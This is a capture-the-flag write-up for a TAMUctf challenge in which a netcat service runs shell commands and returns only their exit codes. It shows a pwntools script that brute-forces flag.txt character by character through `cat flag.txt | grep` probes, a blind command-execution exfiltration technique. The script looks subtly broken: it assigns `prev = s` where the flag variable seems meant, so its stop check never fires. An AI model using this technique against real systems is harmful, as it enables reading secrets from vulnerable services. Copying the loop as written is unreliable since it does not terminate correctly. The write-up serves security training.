# BLIND
Misc

> nc challenges.tamuctf.com 3424

Just playing around with the netcat, it seems to be evaluating our input and returning the error code. This seems like a blind exfiltration.

We can assume that our flag is in `flag.txt`, as when we `cat flag.txt` the error code is `0` (otherwise we can just use the following method to extract the results of `ls`)

We can then use grep with a regex to figure out the contents of `flag.txt`:

`cat flag.txt | grep "^g"` returns a 0.

Knowing this, we can simply set up a script to brute force the characters of the flag:

```python
from pwn import *

r = remote("challenges.tamuctf.com", 3424)


import string

alpha = string.ascii_letters + string.digits + "{}_"
print(alpha)
s = 'cat flag.txt | grep "^{}"'

flag = ""
prev = ""

while True:
	for i in alpha:
		r.sendlineafter(": ", s.format(flag+i))
		x = r.recvline()
		if int(x.strip()) == 0:
			flag += i
			break
	print(flag)
	if prev == flag:
		break
	prev = s


print(flag)
```

Flag: `gigem{r3v3r53_5h3ll5}`
